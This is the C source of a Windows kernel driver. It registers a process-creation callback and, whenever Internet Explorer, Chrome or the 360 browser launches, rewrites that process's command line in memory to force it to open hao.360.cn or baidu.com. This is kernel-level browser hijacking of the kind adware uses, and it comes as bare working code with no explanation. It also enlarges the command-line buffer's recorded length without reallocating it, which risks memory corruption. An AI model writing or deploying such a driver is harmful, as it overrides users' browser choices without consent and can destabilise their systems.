#include<ntifs.h>
#include<ntddk.h>
#pragma warning(disable:4100)
#pragma warning(disable:4152)
#define DEVICE_NAME L"\\Device\\Contact Device"
typedef PPEB(__fastcall *P_PsGetProcessPeb)(PEPROCESS);
typedef CHAR*(__fastcall *F_QueryProcessImageFileName)(PEPROCESS);


P_PsGetProcessPeb PsGetProcessPeb = NULL;
F_QueryProcessImageFileName QueryProcessImageFileName = NULL;
UNICODE_STRING Ie = RTL_CONSTANT_STRING(L"iexplore.exe");
const WCHAR* LockUrl = L" https://hao.360.cn";
PDEVICE_OBJECT Dev = NULL;

#define URL L"C:\\Users\\zlzPC\\AppData\\Roaming\\360se6\\Application\\360se.exe http://www.baidu.com/"


void LockIe(PEPROCESS CurrentProcess)
{
	PPEB iePeb = NULL;
	iePeb = PsGetProcessPeb(CurrentProcess);
	KeAttachProcess(CurrentProcess);
	if (iePeb != NULL)
	{
		ULONG_PTR* param = (ULONG_PTR*)*((ULONG_PTR*)((ULONG_PTR)iePeb + 0x20));
		PUNICODE_STRING commandline = (PUNICODE_STRING)((ULONG_PTR)param + 0x70);
		commandline->MaximumLength += 100;
		NTSTATUS Sta = RtlAppendUnicodeToString(commandline, LockUrl);
		DbgPrint("sta:0x%x\n", Sta);
		DbgPrint("command:%ws\n", commandline->Buffer);
	}
	KeDetachProcess();
}

void Lock360Se(PEPROCESS CurrentProcess)
{
	PPEB iePeb = NULL;
	iePeb = PsGetProcessPeb(CurrentProcess);
	KeAttachProcess(CurrentProcess);
	if (iePeb != NULL)
	{
		ULONG_PTR* param = (ULONG_PTR*)*((ULONG_PTR*)((ULONG_PTR)iePeb + 0x20));
		PUNICODE_STRING commandline = (PUNICODE_STRING)((ULONG_PTR)param + 0x70);
		commandline->MaximumLength += 100;
		/*NTSTATUS Sta = RtlAppendUnicodeToString(commandline, LockUrl);*/
		RtlZeroMemory(commandline->Buffer, commandline->MaximumLength);
		wcscpy(commandline->Buffer, URL);
		/*DbgPrint("sta:0x%x\n", Sta);*/
		DbgPrint("command:%ws\n", commandline->Buffer);
	}
	KeDetachProcess();
}

void LockChrome(PEPROCESS CurrentProcess)
{
	PPEB iePeb = NULL;
	iePeb = PsGetProcessPeb(CurrentProcess);
	KeAttachProcess(CurrentProcess);
	if (iePeb != NULL)
	{
		ULONG_PTR* param = (ULONG_PTR*)*((ULONG_PTR*)((ULONG_PTR)iePeb + 0x20));
		PUNICODE_STRING commandline = (PUNICODE_STRING)((ULONG_PTR)param + 0x70);
		commandline->MaximumLength += 100;
		NTSTATUS Sta = RtlAppendUnicodeToString(commandline, LockUrl);
		DbgPrint("sta:0x%x\n", Sta);
		DbgPrint("command:%ws\n", commandline->Buffer);
	}
	KeDetachProcess();
}

void SetCreateProcessNotifyRoutineEx(
	_In_        HANDLE                 ParentId,
	_In_        HANDLE                 ProcessId,
	_Inout_opt_ PPS_CREATE_NOTIFY_INFO CreateInfo
)
{
	CHAR* ProcessName = NULL;
	PEPROCESS CurrentProcess = NULL;
	PsLookupProcessByProcessId(ProcessId, &CurrentProcess);
	ProcessName=QueryProcessImageFileName(CurrentProcess);
	if (CreateInfo)
	{
		DbgPrint("start: %s\n", ProcessName);
		if (strcmp(ProcessName, "iexplore.exe") == 0)
		{
			LockIe(CurrentProcess);
		}
		else if (strstr(ProcessName,"360se.exe"))
		{
			Lock360Se(CurrentProcess);
		}
		else if (strstr(ProcessName, "chrome.exe"))
		{
			LockChrome(CurrentProcess);
		}
	}
	else
	{
		DbgPrint("stop: %s\n", ProcessName);
	}
}
VOID Unload(PDRIVER_OBJECT Driver)
{
	PsSetCreateProcessNotifyRoutineEx(SetCreateProcessNotifyRoutineEx, TRUE);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING str)
{
	UNICODE_STRING unstrFunName;
	UNICODE_STRING DevName;
	RtlInitUnicodeString(&DevName, DEVICE_NAME);
	DbgBreakPoint();
	driver->DriverUnload = Unload;

	RtlInitUnicodeString(&unstrFunName, L"PsGetProcessPeb");
	PsGetProcessPeb = MmGetSystemRoutineAddress(&unstrFunName);
	if (PsGetProcessPeb == NULL)
	{
		return STATUS_UNSUCCESSFUL;
	}

	RtlInitUnicodeString(&unstrFunName, L"PsGetProcessImageFileName");
	QueryProcessImageFileName= MmGetSystemRoutineAddress(&unstrFunName);
	if (QueryProcessImageFileName == NULL)
	{
		return STATUS_UNSUCCESSFUL;
	}


	PsSetCreateProcessNotifyRoutineEx(SetCreateProcessNotifyRoutineEx, FALSE);

	IoCreateDevice(driver,
		0,
		&DevName,
		FILE_DEVICE_UNKNOWN,
		FILE_DEVICE_SECURE_OPEN, FALSE,
		&Dev);

	Dev->Flags = DO_BUFFERED_IO;
	Dev->Flags &= ~DO_DEVICE_INITIALIZING;

	return STATUS_SUCCESS;
}